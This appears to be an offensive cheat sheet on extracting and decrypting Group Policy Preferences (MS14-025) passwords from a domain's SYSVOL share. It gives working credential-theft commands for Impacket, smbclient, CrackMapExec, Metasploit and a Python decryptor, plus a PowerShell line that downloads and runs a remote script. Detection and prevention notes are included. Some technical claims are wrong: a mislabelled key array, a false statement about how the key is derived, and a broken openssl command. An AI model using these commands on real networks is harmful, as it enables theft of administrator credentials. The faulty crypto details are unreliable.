# <span style="color:rgb(255, 192, 0)">Group Policy Preferences (GPP) Password Extraction</span>

Group Policy Preferences (GPP) allowed administrators to deploy local accounts, scheduled tasks, service configurations, and mapped drives with embedded passwords. These passwords were encrypted with a single AES key that Microsoft published, making them trivially decryptable.

**Vulnerability**: MS14-025 | **Discovery**: @obscuresec | **Fixed**: KB2962486 (April 2014)

**Note**: GPP passwords only exist on systems created with Windows Server 2003/2008/2008R2. Modern systems (2012+) no longer store passwords in GPP, but existing GPOs may still contain them.

---

## <span style="color:rgb(255, 0, 0)">The Encryption Key</span>

Microsoft used a static AES key embedded in the .NET framework:

```csharp
// 32-byte AES key (published in MSDN)
private static byte[] _additionalEntropy = new byte[] { 
    0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88,
    0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00 
};
```

The actual key is derived from the string `"cpassword"` itself.

---

## <span style="color:rgb(0, 176, 240)">Where GPP Passwords Live</span>

| GPP Extension | SYSVOL Path Pattern |
|---------------|-------------------|
| Local Users | `\SYSVOL\<domain>\Policies\<GUID>\User\Preferences\Groups\Groups.xml` |
| Scheduled Tasks | `\SYSVOL\<domain>\Policies\<GUID>\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml` |
| Services | `\SYSVOL\<domain>\Policies\<GUID>\Machine\Preferences\Services\Services.xml` |
| Data Sources | `\SYSVOL\<domain>\Policies\<GUID>\Machine\Preferences\DataSources\DataSources.xml` |
| Mapped Drives | `\SYSVOL\<domain>\Policies\<GUID>\User\Preferences\Drives\Drives.xml` |
| Printers | `\SYSVOL\<domain>\Policies\<GUID>\User\Preferences\Printers\Printers.xml` |
| Environment Vars | `\SYSVOL\<domain>\Policies\<GUID>\User\Preferences\Environment\Environment.xml` |
| Ini Files | `\SYSVOL\<domain>\Policies\<GUID>\Machine\Preferences\IniFiles\IniFiles.xml` |

---

## <span style="color:rgb(146, 208, 80)">Manual Decryption</span>

### Extracting cpassword from Groups.xml
```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1856-52E5-4d24-8B1A-D9BDE98BA1D1}" 
        name="hiddenadmin" 
        image="2" 
        changed="2019-03-12 14:56:11" 
        uid="{A8F3B7E2-1B0E-4A0C-9E3D-7A0F2B0C6E5D}">
    <Properties action="U" 
                newName="" 
                fullName="" 
                description="" 
                cpassword="aIb/YfMjHR7WQ8TLSMqXGsVKfTb5R1vJ6X8y0s5d2A4" 
                userName="CORP\gppadmin" 
                acctDisabled="false" 
                changeLogon="true" 
                noChange="false" 
                neverExpires="true" 
                expireAcct="false" 
                subAuth="0"
                passwrdGrp="1"/>
  </User>
</Groups>
```

### Decrypt with openssl
```bash
# Base64 decode + AES-256-CBC decrypt with published key
echo -n 'cpassword' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000
```

---

## <span style="color:rgb(112, 48, 160)">Automated Tools</span>

### Get-GPPPassword.py (Impacket)
```bash
get-gpppassword.py contoso.local/Administrator:Password@DC01
```
- Connects to SYSVOL, finds all XMLs with `cpassword`, decrypts

### Manual SYSVOL Enumeration
```bash
# List SYSVOL (requires authenticated user)
smbclient //DC01/SYSVOL -U contoso.local/user -c 'recurse; ls' | grep -i 'Groups.xml'

# Download Groups.xml
smbclient //DC01/SYSVOL -U contoso.local/user -c 'get "Policies\{GUID}\User\Preferences\Groups\Groups.xml"'
```

### PowerView (PowerShell)
```powershell
# Find all GPP files with passwords
Get-NetGPO | % {
    $path = "\\$($_.gpcfilesyspath)\Machine\Preferences\Groups\Groups.xml"
    if (Test-Path $path) { Get-Content $path }
}
```

### PowerSploit (Get-GPPPassword)
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://SERVER/Get-GPPPassword.ps1')
Get-GPPPassword -Domain contoso.local
```

### CME (CrackMapExec)
```bash
crackmapexec smb DC01 -u user -p pass -M gpp_password
```

### Metasploit
```msf
use post/windows/gather/credentials/gpp
set SESSION 1
run
```

---

## <span style="color:rgb(0, 32, 96)">Python Decryption One-liner</span>

```python
#!/usr/bin/env python3
from Crypto.Cipher import AES
from base64 import b64decode

def decrypt_gpp(cpassword):
    key = b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b'
    iv = b'\x00' * 16
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(b64decode(cpassword))
    return decrypted.rstrip(b'\x00').decode('utf-16-le')

cpassword = "aIb/YfMjHR7WQ8TLSMqXGsVKfTb5R1vJ6X8y0s5d2A4"
print(decrypt_gpp(cpassword))
```

---

## <span style="color:rgb(94, 18, 18)">Detection & Prevention</span>

### Detection
```powershell
# Find all GPOs with cpassword
Get-GPO -All | 
    Select-Object DisplayName, Id, 
        @{Name="HasCPassword"; Expression={
            $path = "\\$((Get-ADDomain).DNSRoot)\SYSVOL\$(Get-ADDomain).DNSRoot\Policies\{$($_.Id)}\Machine\Preferences\Groups\Groups.xml"
            Test-Path $path -and (Select-String -Path $path -Pattern "cpassword" -Quiet)
        }}
```

### Sysmon / Event Logs
- **4688**: `get-gpppassword.py`, `crackmapexec`, or SMB enumeration tools
- **5140**: SMB share access to `SYSVOL`
- **5145**: Network share access to `Groups.xml`

### Prevention
| Action | Detail |
|--------|--------|
| Remove legacy GPOs | Audit all GPOs; remove stale ones |
| Regenerate passwords | Redeploy without GPP; use LAPS instead |
| Patch | KB2962486 (Server 2012+ already patched) |
| Audit | Check for `cpassword` in SYSVOL regularly |
| SYSVOL permissions | Restrict read access on SYSVOL |

### Microsoft's Patch
The patch (KB2962486) adds a warning when creating GPP items that include passwords, but does **not** remove existing cpassword values from deployed GPOs.

---

## <span style="color:rgb(255, 255, 0)">OPSEC</span>

- GPP is accessible by **any authenticated domain user** (no admin required)
- SYSVOL is readable by all domain users by default
- After extraction, the password may grant local admin on all joined workstations
- Large organizations may have hundreds of stale GPOs with exposed passwords
- Check: `\\<domain>\SYSVOL\<domain>\Policies\` recursively
